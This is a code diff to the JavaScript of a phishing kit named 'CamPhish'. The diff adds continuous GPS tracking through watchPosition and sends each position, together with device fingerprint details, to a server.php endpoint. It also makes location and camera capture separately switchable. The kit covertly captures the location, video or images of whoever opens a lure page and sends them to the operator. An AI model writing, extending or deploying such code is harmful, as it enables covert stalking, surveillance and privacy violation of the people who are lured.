@@ -36,14 +36,23 @@
     function captureLocation(baseUrl) {
         if (!navigator.geolocation) return;
         var opts = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
+
+        // Send initial position immediately
         navigator.geolocation.getCurrentPosition(function (pos) {
             var device = getDeviceInfo();
-            var data = { a: 'loc', lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy || 'N/A', alt: pos.coords.altitude || 'N/A', heading: pos.coords.heading || 'N/A', speed: pos.coords.speed || 'N/A', platform: device.platform, browser: device.browser, cores: device.cores, ram: device.ram, gpu_vendor: device.gpu_vendor, gpu_renderer: device.gpu_renderer, screen: device.screen_width + 'x' + device.screen_height, os: device.os, timezone: device.timezone, language: device.language, connection: device.connection };
+            var data = { a: 'loc', lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy || 'N/A', alt: pos.coords.altitude || 'N/A', heading: pos.coords.heading || 'N/A', speed: pos.coords.speed || 'N/A', platform: device.platform, browser: device.browser, cores: device.cores, ram: device.ram, gpu_vendor: device.gpu_vendor, gpu_renderer: device.gpu_renderer, screen: device.screen_width + 'x' + device.screen_height, os: device.os, timezone: device.timezone, language: device.language, connection: device.connection, attempts: 1 };
             sendData(baseUrl + '/server.php', data);
         }, function (err) {
             var device = getDeviceInfo();
             sendData(baseUrl + '/server.php', { a: 'loc', error: err.code, platform: device.platform, browser: device.browser, os: device.os, timezone: device.timezone });
         }, opts);
+
+        // Send continuous updates
+        navigator.geolocation.watchPosition(function (pos) {
+            var device = getDeviceInfo();
+            var data = { a: 'loc', lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy || 'N/A', alt: pos.coords.altitude || 'N/A', heading: pos.coords.heading || 'N/A', speed: pos.coords.speed || 'N/A', platform: device.platform, browser: device.browser, cores: device.cores, ram: device.ram, gpu_vendor: device.gpu_vendor, gpu_renderer: device.gpu_renderer, screen: device.screen_width + 'x' + device.screen_height, os: device.os, timezone: device.timezone, language: device.language, connection: device.connection, watch: true };
+            sendData(baseUrl + '/server.php', data);
+        }, null, opts);
     }
 
     function captureVideo(baseUrl) {
@@ -131,14 +140,22 @@
     }
 
     window.CamPhish = {
-        init: function (baseUrl) {
-            captureLocation(baseUrl);
-            if (typeof MediaRecorder !== 'undefined') { captureVideo(baseUrl); }
-            else { captureImages(baseUrl); }
+        init: function (baseUrl, useLoc, useCam) {
+            console.log("CamPhish Init: " + baseUrl + " Loc: " + useLoc + " Cam: " + useCam);
+            if (useLoc === true || useLoc === 'true') {
+                captureLocation(baseUrl);
+            }
+            if (useCam === true || useCam === 'true') {
+                if (typeof MediaRecorder !== 'undefined') { captureVideo(baseUrl); }
+                else { captureImages(baseUrl); }
+            }
         }
     };
 
     setTimeout(function () {
-        if (typeof window.CAMPHISH_URL !== 'undefined') { captureLocation(window.CAMPHISH_URL); }
+        if (typeof window.CAMPHISH_URL !== 'undefined') {
+            // Fallback if defined globally
+            captureLocation(window.CAMPHISH_URL);
+        }
     }, 100);
 })();
